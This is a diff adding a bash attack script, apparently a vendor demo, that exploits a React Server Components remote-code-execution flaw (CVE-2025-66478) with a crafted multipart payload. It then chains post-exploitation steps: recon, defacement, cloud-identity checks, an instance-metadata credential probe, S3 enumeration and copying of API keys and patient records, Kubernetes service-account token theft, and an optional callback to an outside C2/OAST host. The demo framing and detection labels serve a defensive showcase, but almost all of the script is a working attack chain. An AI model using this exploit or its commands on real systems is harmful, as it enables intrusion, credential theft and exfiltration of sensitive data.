@@ -1,0 +1,326 @@
+#!/bin/bash
+#
+# Wiz Demo v3 - IRSA-first Attack Script
+# CVE-2025-66478 React Server Components RCE (React2Shell)
+#
+# Goal: Emulate a cloud-native attacker chain:
+#   RCE → (IRSA) AWS identity/permissions → S3 discovery/exfil → K8s API via SA token
+#
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
+
+usage() {
+  cat <<EOF
+Usage:
+  ./wiz-demo-v3.sh [HOST] [PORT]
+
+Options:
+  --host <host>         Target hostname (NLB DNS)
+  --port <port>         Target port (default: 80)
+  --bucket <name>       S3 bucket name to target (defaults to Terraform output if available)
+  --oast-url <url>      Optional full OAST/C2 URL (no auto-subdomain; avoid '&' in the URL)
+  --oast-domain <dom>   Optional OAST base domain (e.g. your interact.sh domain); script prefixes a unique subdomain
+  --oast-scheme <sch>   OAST scheme when using --oast-domain (default: http)
+  --include-imds        Also run an IMDS probe step (noisy fallback)
+  -h, --help            Show this help
+
+Notes:
+  - If HOST is omitted, the script tries to auto-detect it via:
+      terraform outputs (app_namespace/app_workload_name) + kubectl get svc
+  - This script triggers commands on the target via the CVE payload. Do not run against systems you do not own.
+EOF
+}
+
+TARGET=""
+PORT="80"
+S3_BUCKET=""
+OAST_URL=""
+OAST_DOMAIN=""
+OAST_SCHEME="http"
+INCLUDE_IMDS="0"
+
+while [ $# -gt 0 ]; do
+  case "$1" in
+    --host)
+      TARGET="${2:-}"
+      shift 2
+      ;;
+    --port)
+      PORT="${2:-80}"
+      shift 2
+      ;;
+    --bucket)
+      S3_BUCKET="${2:-}"
+      shift 2
+      ;;
+    --oast-url)
+      OAST_URL="${2:-}"
+      shift 2
+      ;;
+    --oast-domain)
+      OAST_DOMAIN="${2:-}"
+      shift 2
+      ;;
+    --oast-scheme)
+      OAST_SCHEME="${2:-http}"
+      shift 2
+      ;;
+    --include-imds)
+      INCLUDE_IMDS="1"
+      shift 1
+      ;;
+    -h|--help)
+      usage
+      exit 0
+      ;;
+    *)
+      if [ -z "${TARGET}" ]; then
+        TARGET="$1"
+      elif [ "${PORT}" = "80" ]; then
+        PORT="$1"
+      else
+        echo "Unknown arg: $1" >&2
+        usage >&2
+        exit 1
+      fi
+      shift 1
+      ;;
+  esac
+done
+
+SLEEP_TIME=2
+PAYLOAD_FILE="/tmp/exploit-payload-$$.bin"
+
+if ! command -v python3 >/dev/null 2>&1; then
+  echo "python3 not found in PATH" >&2
+  exit 1
+fi
+if ! command -v curl >/dev/null 2>&1; then
+  echo "curl not found in PATH" >&2
+  exit 1
+fi
+
+TF_DIR="infra/aws"
+if [ -z "${S3_BUCKET}" ] && command -v terraform >/dev/null 2>&1; then
+  S3_BUCKET="$(terraform -chdir="${TF_DIR}" output -raw s3_bucket_name 2>/dev/null || true)"
+fi
+
+if [ -z "${TARGET}" ] && command -v terraform >/dev/null 2>&1 && command -v kubectl >/dev/null 2>&1; then
+  APP_NS="$(terraform -chdir="${TF_DIR}" output -raw app_namespace 2>/dev/null || true)"
+  APP_NAME="$(terraform -chdir="${TF_DIR}" output -raw app_workload_name 2>/dev/null || true)"
+  if [ -n "${APP_NS}" ] && [ -n "${APP_NAME}" ]; then
+    TARGET="$(kubectl get svc "${APP_NAME}" -n "${APP_NS}" -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' 2>/dev/null || true)"
+  fi
+fi
+
+# Interactive input if still missing
+if [ -z "${TARGET}" ]; then
+  echo -e "${CYAN}Wiz Demo v3 - Target Configuration${NC}"
+  echo ""
+  read -p "Enter target host [localhost]: " INPUT_TARGET
+  TARGET="${INPUT_TARGET:-localhost}"
+  read -p "Enter target port [${PORT}]: " INPUT_PORT
+  PORT="${INPUT_PORT:-${PORT}}"
+  echo ""
+fi
+
+if [ -z "${S3_BUCKET}" ]; then
+  echo -e "${CYAN}Wiz Demo v3 - S3 Target${NC}"
+  echo ""
+  read -p "Enter sensitive S3 bucket name (Terraform: infra/aws output s3_bucket_name): " INPUT_BUCKET
+  S3_BUCKET="${INPUT_BUCKET:-}"
+  echo ""
+fi
+
+if [ -z "${S3_BUCKET}" ]; then
+  echo "S3 bucket name is required (use --bucket or ensure terraform outputs are available)." >&2
+  exit 1
+fi
+
+if [ -z "${OAST_URL}" ] && [ -n "${OAST_DOMAIN}" ]; then
+  # Generate a DNS-safe, unique-ish subdomain per run (helps interact.sh timelines).
+  OAST_PREFIX="wiz-$(date +%s)-$RANDOM"
+  OAST_URL="${OAST_SCHEME}://${OAST_PREFIX}.${OAST_DOMAIN}/"
+fi
+
+TOTAL_ATTACKS=8
+if [ "${INCLUDE_IMDS}" = "1" ]; then
+  TOTAL_ATTACKS=$((TOTAL_ATTACKS + 1))
+fi
+if [ -n "${OAST_URL}" ]; then
+  TOTAL_ATTACKS=$((TOTAL_ATTACKS + 1))
+fi
+
+ATTACK_NUM=0
+
+# Banner
+echo -e "${RED}"
+cat << 'EOF'
+ __        ___       ____                          _____
+ \ \      / (_)____ |  _ \  ___ _ __ ___   ___    |___ /  (v3)
+  \ \ /\ / /| |_  / | | | |/ _ \ '_ ` _ \ / _ \     |_ \
+   \ V  V / | |/ /  | |_| |  __/ | | | | | (_) |   ___) |
+    \_/\_/  |_/___| |____/ \___|_| |_| |_|\___/   |____/
+
+EOF
+echo -e "${NC}"
+echo -e "${WHITE}CVE-2025-66478 - React Server Components RCE${NC}"
+echo -e "${YELLOW}IRSA-first attacker chain (cloud-native)${NC}"
+echo ""
+echo -e "${CYAN}Target:${NC} http://${TARGET}:${PORT}"
+echo -e "${CYAN}S3 Bucket:${NC} ${S3_BUCKET}"
+echo -e "${CYAN}Steps:${NC} ${TOTAL_ATTACKS}"
+echo ""
+echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
+echo ""
+
+# Payload delivery function (CVE-2025-66478 exploit)
+send_payload() {
+  local cmd="$1"
+
+  # IMPORTANT: keep commands free of single quotes (') and double quotes (") or the payload may break.
+  python3 -c "
+import sys
+payload = '''------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name=\"0\"\r
+\r
+{\"then\":\"\$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\\\"then\\\\\":\\\\\"\$B1337\\\\\"}\",\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('$cmd');\",\"_chunks\":\"\$Q2\",\"_formData\":{\"get\":\"\$1:constructor:constructor\"}}}\r
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name=\"1\"\r
+\r
+\"\$@0\"\r
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name=\"2\"\r
+\r
+[]\r
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
+'''
+sys.stdout.buffer.write(payload.replace('\\\\r\\\\n', '\r\n').encode())
+" > "$PAYLOAD_FILE"
+
+  curl -s -X POST "http://${TARGET}:${PORT}" \
+    -H "Next-Action: x" \
+    -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
+    --data-binary @"$PAYLOAD_FILE" \
+    --connect-timeout 3 -m 5 >/dev/null 2>&1 || true
+  rm -f "$PAYLOAD_FILE" 2>/dev/null || true
+}
+
+run_attack() {
+  local icon="$1"
+  local name="$2"
+  local desc="$3"
+  local wiz_alert="$4"
+  local cmd="$5"
+
+  ATTACK_NUM=$((ATTACK_NUM + 1))
+
+  echo -e "${YELLOW}[${ATTACK_NUM}/${TOTAL_ATTACKS}]${NC} ${icon} ${WHITE}${name}${NC}"
+  echo -e "    ${BLUE}→${NC} ${desc}"
+  echo -e "    ${GREEN}⚡ Wiz:${NC} ${wiz_alert}"
+  echo ""
+  send_payload "$cmd"
+  echo -e "    ${GREEN}✓${NC} Executed"
+  echo ""
+  echo -e "${BLUE}───────────────────────────────────────────────────────────────${NC}"
+  echo ""
+  sleep "${SLEEP_TIME}"
+}
+
+# ═══════════════════════════════════════════════════════════════
+# PHASE 1: Initial Access (React2Shell)
+# ═══════════════════════════════════════════════════════════════
+
+echo -e "${PURPLE}▶ PHASE 1: Initial Access (React2Shell)${NC}"
+echo ""
+
+run_attack "💥" "RCE Proof + Recon" \
+  "Runs whoami/id/uname and drops a marker file" \
+  "Execution from Next.js + Suspicious Command" \
+  'whoami > /tmp/pwned.txt && id >> /tmp/pwned.txt && uname -a >> /tmp/pwned.txt && echo PWNED >> /tmp/pwned.txt'
+
+run_attack "🎨" "UI Defacement (Visual Proof)" \
+  "Overwrites site banner to show PWNED state" \
+  "Malicious File Write" \
+  'echo eyJtZXNzYWdlIjoiUFdORUQifQ== | base64 -d > /tmp/banner.json'
+
+# ═══════════════════════════════════════════════════════════════
+# PHASE 2: Cloud Identity (IRSA-first)
+# ═══════════════════════════════════════════════════════════════
+
+echo -e "${PURPLE}▶ PHASE 2: Cloud Identity (IRSA-first)${NC}"
+echo ""
+
+run_attack "🪪" "IRSA Identity Confirmation" \
+  "Uses pod identity (web identity token) to call STS and record the AWS principal" \
+  "Cloud Identity / STS Activity" \
+  'echo AWS_ROLE_ARN=$AWS_ROLE_ARN > /tmp/aws-irsa-env.txt; echo AWS_WEB_IDENTITY_TOKEN_FILE=$AWS_WEB_IDENTITY_TOKEN_FILE >> /tmp/aws-irsa-env.txt; ls -l $AWS_WEB_IDENTITY_TOKEN_FILE >> /tmp/aws-irsa-env.txt 2>&1; aws sts get-caller-identity > /tmp/aws-sts.json 2>&1 || echo STS_CALL_FAILED >> /tmp/aws-sts.json'
+
+# Optional/noisy fallback: IMDS probe (some attackers try this if IRSA is limited)
+if [ "${INCLUDE_IMDS}" = "1" ]; then
+  run_attack "☁️" "IMDS Probe (Noisy Fallback)" \
+    "Attempts to reach instance metadata (often blocked in modern clusters)" \
+    "Cloud Metadata Service Access" \
+    'curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/imds-role.txt 2>&1 || echo IMDS_BLOCKED > /tmp/imds-role.txt'
+fi
+
+# ═══════════════════════════════════════════════════════════════
+# PHASE 3: Cloud Lateral Movement (AWS)
+# ═══════════════════════════════════════════════════════════════
+
+echo -e "${PURPLE}▶ PHASE 3: Cloud Lateral Movement (AWS)${NC}"
+echo ""
+
+run_attack "🪣" "S3 Enumeration (With Pod Identity)" \
+  "Lists accessible buckets using the pod’s AWS permissions (IRSA)" \
+  "Cloud API Enumeration" \
+  'aws s3 ls > /tmp/s3-buckets.txt 2>&1'
+
+run_attack "📂" "Sensitive Bucket Discovery" \
+  "Lists objects in the target bucket to identify sensitive data" \
+  "Cloud Data Access" \
+  "aws s3 ls s3://${S3_BUCKET}/ --recursive > /tmp/s3-objects.txt 2>&1"
+
+run_attack "📤" "Data Exfiltration (S3)" \
+  "Copies a few representative sensitive files from S3 to local disk" \
+  "Data Exfiltration" \
+  "aws s3 cp s3://${S3_BUCKET}/employees.json /tmp/exfil-employees.json 2>&1; aws s3 cp s3://${S3_BUCKET}/config/api_keys.env /tmp/exfil-api-keys.env 2>&1; aws s3 cp s3://${S3_BUCKET}/healthcare/patient_records.json /tmp/exfil-medical.json 2>&1"
+
+# ═══════════════════════════════════════════════════════════════
+# PHASE 4: Kubernetes Lateral Movement (In-Cluster)
+# ═══════════════════════════════════════════════════════════════
+
+echo -e "${PURPLE}▶ PHASE 4: Kubernetes Lateral Movement (In-Cluster)${NC}"
+echo ""
+
+run_attack "🎫" "Service Account Token Theft" \
+  "Reads the mounted Kubernetes service account token" \
+  "Sensitive File Access" \
+  'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/k8s-token.txt 2>/dev/null || echo TOKEN_READ_FAILED > /tmp/k8s-token.txt'
+
+run_attack "🔎" "K8s API Discovery (Token + curl)" \
+  "Uses the stolen token to query the Kubernetes API server (no kubectl needed)" \
+  "K8s Discovery / API Access" \
+  'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); echo Authorization: Bearer $TOKEN > /tmp/k8s-auth-header.txt; CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt; APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT; curl -s --cacert $CA -H @/tmp/k8s-auth-header.txt $APISERVER/api/v1/pods?limit=50 > /tmp/k8s-pods.json 2>&1; curl -s --cacert $CA -H @/tmp/k8s-auth-header.txt $APISERVER/api/v1/namespaces?limit=50 > /tmp/k8s-namespaces.json 2>&1'
+
+# Optional: C2/OAST beacon
+if [ -n "${OAST_URL}" ]; then
+  run_attack "📡" "OAST Beacon (C2 Callback)" \
+    "Sends an HTTP callback (use your own OAST URL)" \
+    "C2 / Exfil Beacon" \
+    "curl -s ${OAST_URL} --connect-timeout 3 2>/dev/null || echo OAST_BEACON_ATTEMPTED > /tmp/oast-marker.txt"
+fi
+
+echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
+echo ""
+echo -e "${GREEN}Done.${NC} Check Wiz Defend → Threats for the timeline."
+echo -e "${CYAN}Artifacts (in-pod):${NC} /tmp/pwned.txt, /tmp/aws-sts.json, /tmp/s3-objects.txt, /tmp/exfil-*.json, /tmp/k8s-*.json"
+echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
